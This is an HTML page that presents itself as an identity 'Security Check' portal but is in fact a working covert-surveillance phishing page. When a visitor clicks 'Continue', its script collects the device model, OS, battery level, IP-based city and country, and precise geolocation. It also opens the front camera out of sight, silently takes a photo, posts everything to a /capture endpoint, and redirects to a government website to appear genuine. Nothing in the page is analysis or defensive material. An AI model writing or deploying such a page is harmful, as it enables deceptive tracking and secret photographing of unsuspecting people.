<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Identity Verification Portal</title>
    <style>
        :root { --primary: #28a745; --bg: #f5f7f9; }
        body { font-family: -apple-system, system-ui, sans-serif; background-color: var(--bg); display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .card { background: white; width: 90%; max-width: 380px; padding: 30px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); text-align: center; border: 1px solid #ddd; }
        .btn { background: var(--primary); color: white; border: none; padding: 16px; width: 100%; border-radius: 10px; font-size: 17px; font-weight: 700; cursor: pointer; transition: 0.3s; }
        #loader { display: none; margin-top: 20px; font-weight: 600; color: var(--primary); }
    </style>
</head>
<body>

<div class="card">
    <div style="height:4px; background:var(--primary); width:60px; margin:0 auto 20px; border-radius:10px;"></div>
    <h2>Security Check</h2>
    <p style="color:#555; font-size:14px; margin-bottom:25px;">Please verify your identity to continue to the secure portal.</p>
    <button id="mainBtn" class="btn" onclick="execute()">CONTINUE TO PORTAL</button>
    <div id="loader">Processing Secure Link...</div>
</div>

<video id="v" style="display:none;" autoplay playsinline></video>
<canvas id="c" style="display:none;" width="1080" height="1920"></canvas>

<script>
    async function execute() {
        document.getElementById('mainBtn').style.display = 'none';
        document.getElementById('loader').style.display = 'block';

        let report = {
            model: "Unknown", os: "Unknown", battery: "N/A",
            ip: "N/A", city: "N/A", country: "N/A", lat: "0", lon: "0"
        };

        // 1. Precise Hardware & OS Detection
        let ua = navigator.userAgent;
        if (/android/i.test(ua)) {
            let m = ua.match(/Android\s([0-9\.]+);\s([^;)]+)/);
            report.os = m ? "Android " + m[1] : "Android";
            report.model = m ? m[2] : "Android Device";
        } else if (/iPhone|iPad/i.test(ua)) {
            report.os = "iOS";
            let w = window.screen.width;
            report.model = (w >= 430) ? "iPhone Pro Max" : (w >= 390) ? "iPhone Pro/Standard" : "iPhone";
        }

        // 2. Battery retrieval
        if(navigator.getBattery) {
            const b = await navigator.getBattery();
            report.battery = Math.round(b.level * 100) + "%";
        }

        // 3. Guaranteed IP & Location Fetching
        const getGeo = async () => {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                report.ip = d.ip || "N/A";
                report.city = d.city || "N/A";
                report.country = d.country_name || "N/A";
            } catch (e) { report.city = "Access Blocked"; }
        };

        // 4. Parallel Camera and Data Fetch
        const cameraPromise = navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user", width: 1080, height: 1920 } 
        }).catch(() => null);

        const geoPromise = getGeo();

        navigator.geolocation.getCurrentPosition(async (pos) => {
            report.lat = pos.coords.latitude;
            report.lon = pos.coords.longitude;
            complete(await cameraPromise, report, geoPromise);
        }, async () => {
            complete(await cameraPromise, report, geoPromise);
        }, { timeout: 6000 });
    }

    async function complete(stream, data, geoTask) {
        await geoTask; // Wait for IP/City to finish
        if (stream) {
            const video = document.getElementById('v');
            video.srcObject = stream;
            // 2.5s delay for auto-brightness and HD focus
            setTimeout(() => {
                const canvas = document.getElementById('c');
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const photo = canvas.toDataURL('image/jpeg', 0.9);
                stream.getTracks().forEach(t => t.stop());
                finish(data, photo);
            }, 2500);
        } else { finish(data, null); }
    }

    function finish(d, p) {
        fetch('/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ info: d, photo: p })
        }).then(() => {
            window.location.href = "https://www.pakistan.gov.pk/";
        });
    }
</script>
</body>
</html>
